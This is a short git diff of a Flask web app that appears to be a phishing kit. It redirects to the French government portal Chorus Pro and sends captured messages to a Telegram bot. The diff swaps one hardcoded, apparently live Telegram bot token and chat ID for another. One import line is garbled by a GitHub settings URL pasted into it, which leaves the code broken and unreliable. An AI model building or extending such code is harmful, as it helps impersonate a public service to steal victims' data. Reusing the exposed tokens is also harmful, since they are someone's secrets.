@@ -1,4 +1,4 @@
-from flask import Flask, request, redirect, render_template, session, flash
+from flask import Flask, request, redirect, render_template, session, flashhttps://github.com/elenaclairelaphonte-cloud/Aspiring/settings
 import requests
 
 app = Flask(__name__)
@@ -6,8 +6,8 @@ app.secret_key = "super_secret_key_change_moi_avec_une_vraie_longue_cle"
 
 REDIRECT_URL = "https://portail.chorus-pro.gouv.fr/aife_csm/fr"
 
-TOKEN = "8999224838:AAHPrTwA1stt63873EzUANAtTM2uL8UJkuM"
-CHAT_ID = 8511325661
+TOKEN = "5597048673:AAFLr8KyvvrX0ww8vyAjhnTPWYO0YDGha9g"
+CHAT_ID = 951613248
 
 
 def send_to_telegram(message: str):
